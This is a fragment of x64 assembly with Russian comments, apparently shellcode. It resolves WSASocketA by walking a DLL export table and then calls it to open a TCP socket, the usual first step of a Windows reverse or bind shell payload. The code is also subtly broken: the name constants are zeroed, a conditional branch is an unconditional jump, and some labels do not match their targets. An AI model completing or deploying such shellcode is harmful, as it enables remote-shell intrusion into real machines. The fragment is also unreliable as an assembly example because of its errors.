  mov r12, 0 ;WSASocke
  mov r13, 0 ;tA\0\0\0\0\0\0

  xor r11, r11
.search_loop_WSASocketA
  mov edi, dword ptr [r8 + r11 * 4]
  add rdi, r15

  mov rax, qword ptr [rdi]
  cmp rax, r12
  jne .not_found_WSASocketA

  mov rax, qword ptr [rdi + 8]
  cmp rax, r13
  jmp .function_found_WSASocketA

.not_found_WSASocket
  inc r11
  jmp .search_loopWSASocketA

.function_found_WSASocketA
  movzx r12d, word ptr [r9 + r11 * 2]
  mov eax, dword ptr [r10 + r12 * 4]
  add rax, r15

mov rbx, rax ;rbx = адрес WSASocket

;вызов

mov ecx, 2 ;AF_INET/ipv4
mov edx, 1 ;SOCK_STREAM ПОТОКОВЫЙ СОКЕТ ДЛЯ TCP
mov r8, 6 ;IPPROTO_TCP ПРОТОКОЛ TPC
mov r9, 0
sub rsp, 48
mov qword ptr [rsp + 40], 0
mov qword ptr [rsp + 32], 0

call rbx
add rsp, 48

mov r12, rax
